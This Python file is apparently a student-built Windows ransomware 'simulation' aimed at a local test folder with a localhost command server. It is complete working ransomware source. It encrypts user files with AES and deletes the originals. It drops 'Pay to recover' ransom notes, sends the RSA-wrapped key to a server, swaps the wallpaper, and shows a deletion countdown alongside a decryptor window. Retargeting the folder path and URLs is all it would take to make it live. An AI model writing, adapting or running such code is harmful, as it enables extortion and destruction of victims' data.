import os
import sys
import requests
import json
import base64
import uuid
import threading
import tkinter as tk
import winreg
import ctypes
from tkinter import messagebox, PhotoImage
from datetime import datetime, timedelta
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from Crypto.PublicKey import RSA

# --- ASSET CONFIGURATION ---
WALLPAPER_NAME = "wallpaper.png"
THANK_YOU_NAME = "thank-you.png"
ICON_NAME = "app_icon.ico"

# --- SYSTEM CONFIGURATION ---
TEST_TARGET = r"C:\Users\rs685\OneDrive\Desktop\TestFolder"
ID_FILE_PATH = os.path.join(TEST_TARGET, "Machine_id.txt")
DRIVES_TO_ENCRYPT = [TEST_TARGET] 
EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf']

DASHBOARD_URL = 'http://localhost:3000/api/receive_key'
STOP_SIGNAL_URL = 'http://localhost:3000/api/check_stop_signal'
PASSWORD_PROVIDED = 'PleaseGiveMeMoney'

# --- NEW: VISUAL FUNCTIONS ---
def set_wallpaper():
    """Changes the desktop background to the ransom note."""
    try:
        path = os.path.join(os.getcwd(), WALLPAPER_NAME)
        if os.path.exists(path):
            # SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except Exception as e:
        print(f"Wallpaper Error: {e}")

class EncryptionTool:
    # ... (Your existing __init__, generate_aes_key, and encrypt_file are perfect) ...
    def __init__(self, drives, extensions, password):
        self.drives = drives
        self.extensions = extensions
        self.password = password
        self.machine_id = str(uuid.uuid4())
        self.key = self.generate_aes_key(password)

    def generate_aes_key(self, password):
        salt = b'\x00' * 16 
        return PBKDF2(password.encode(), salt, dkLen=32, count=100000)

    def encrypt_file(self, file_path):
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            with open(file_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
            with open(file_path + '.encrypted', 'wb') as f:
                f.write(iv + encrypted_data)
            os.remove(file_path)
        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")

    def execute(self):
        print(f"Encrypting targets...")
        note_content = f"YOUR FILES ARE ENCRYPTED\nMachine ID: {self.machine_id}\nPay to recover."
        
        for drive in self.drives:
            for root, dirs, files in os.walk(drive):
                with open(os.path.join(root, "READ_ME_FOR_DECRYPTION.txt"), "w") as f:
                    f.write(note_content)
                for file in files:
                    if any(file.endswith(ext) for ext in self.extensions):
                        self.encrypt_file(os.path.join(root, file))

        with open(ID_FILE_PATH, 'w') as f: f.write(self.machine_id)

        try:
            pub_key = RSA.import_key(open("receiver_public.pem").read())
            cipher_rsa = PKCS1_OAEP.new(pub_key)
            encrypted_aes_key = cipher_rsa.encrypt(self.key)
            encoded_key = base64.b64encode(encrypted_aes_key).decode('utf-8')
            
            payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
            requests.post(DASHBOARD_URL, json=payload)
            print(f"Encrypted AES key sent via RSA.")
            set_wallpaper() # Trigger wallpaper change after encryption
        except Exception as e:
            print(f"Server communication failed: {e}")

class DecryptorApp(tk.Tk):
    # ... (Your existing __init__, update_timer, check_server_signal are good) ...
    def __init__(self, machine_id):
        super().__init__()
        self.machine_id = machine_id
        self.title("CRYPTO-LOCKER SIMULATION")
        self.geometry("600x600")
        self.configure(bg="black")
        self.stop_signal_received = False
        self.deadline = None

        tk.Label(self, text="YOUR FILES ARE ENCRYPTED", fg="red", bg="black", font=("Courier", 20, "bold")).pack(pady=20)
        self.timer_label = tk.Label(self, text="INITIALIZING TIMER...", fg="yellow", bg="black", font=("Courier", 14, "bold"))
        self.timer_label.pack(pady=10)

        self.log_box = tk.Listbox(self, bg="#111", fg="#0f0", width=60, height=12, font=("Consolas", 10))
        self.log_box.pack(pady=10)
        self.log_box.insert(tk.END, f"[SYSTEM] Identification: {self.machine_id}")

        self.key_entry = tk.Entry(self, width=50, justify='center')
        self.key_entry.pack(pady=10)
        tk.Button(self, text="START DECRYPTION", command=self.start_decryption, bg="red", fg="white", font=("Arial", 10, "bold")).pack(pady=10)

        threading.Thread(target=self.check_server_signal, daemon=True).start()

    def update_timer(self):
        if self.stop_signal_received:
            self.timer_label.config(text="DELETION ABORTED - SYSTEM UNLOCKED", fg="cyan")
            return

        remaining = self.deadline - datetime.now()
        if remaining.total_seconds() > 0:
            time_str = str(remaining).split(".")[0]
            self.timer_label.config(text=f"TIME UNTIL DELETION: {time_str}")
            if remaining.total_seconds() < 3600:
                self.timer_label.config(fg="orange" if int(remaining.total_seconds()) % 2 == 0 else "red")
            self.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="DEADLINE EXPIRED: DELETING...", fg="red")
            # self.trigger_deletion_warning()

    def check_server_signal(self):
        while True:
            try:
                resp = requests.post(STOP_SIGNAL_URL, json={'machine_id': self.machine_id}, timeout=5)
                data = resp.json()
                if not self.deadline and data.get('deadline'):
                    self.deadline = datetime.fromisoformat(data.get('deadline').replace('Z', '+00:00')).replace(tzinfo=None)
                    self.after(0, self.update_timer)
                elif not self.deadline:
                    self.deadline = datetime.now() + timedelta(hours=24)
                    self.after(0, self.update_timer)

                if str(data.get('stop_signal')) == "1":
                    self.stop_signal_received = True
                    self.configure(bg="#002200")
                    self.log_box.insert(tk.END, "[SUCCESS] Remote stop signal received.")
                    break
            except: pass
            threading.Event().wait(2)

    def start_decryption(self):
        try:
            key_bytes = base64.b64decode(self.key_entry.get().strip())
            for root, dirs, files in os.walk(TEST_TARGET):
                for file in files:
                    if file.endswith(".encrypted"):
                        with open(os.path.join(root, file), 'rb') as f:
                            iv, encrypted_data = f.read(16), f.read()
                        cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
                        original_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                        with open(os.path.join(root, file.replace(".encrypted", "")), 'wb') as f:
                            f.write(original_data)
                        os.remove(os.path.join(root, file))
            
            # Show the Success Screen
            self.show_thank_you()
            messagebox.showinfo("Success", "Decryption Successful.")
        except:
            messagebox.showerror("Error", "Invalid Key.")

    def show_thank_you(self):
        """Displays the thank-you image in a new window."""
        top = tk.Toplevel()
        top.title("Recovery Complete")
        try:
            img = PhotoImage(file=THANK_YOU_NAME)
            lbl = tk.Label(top, image=img)
            lbl.image = img # Keep reference
            lbl.pack()
        except:
            tk.Label(top, text="THANK YOU - SYSTEM RESTORED", font=("Arial", 14)).pack(pady=20)

# --- SINGLE ENTRY POINT ---
if __name__ == "__main__":
    current_id = None
    if os.path.exists(ID_FILE_PATH):
        with open(ID_FILE_PATH, 'r') as f: current_id = f.read().strip()

 #agar 2 step mei locking karni hai tab

    # if current_id:
    #     app = DecryptorApp(current_id)
    #     app.mainloop()
    # else:
    #     # add_to_startup() 
    #     tool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSIONS_TO_ENCRYPT, PASSWORD_PROVIDED)
    #     tool.execute()
 
 # Agar 1 step mei locking karni hai tab
    if not current_id:
        tool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSIONS_TO_ENCRYPT, PASSWORD_PROVIDED)
        tool.execute()
        current_id = tool.machine_id # Get the new ID to pass to the app

    # This part runs for both new infections and existing ones
    app = DecryptorApp(current_id)
    app.mainloop()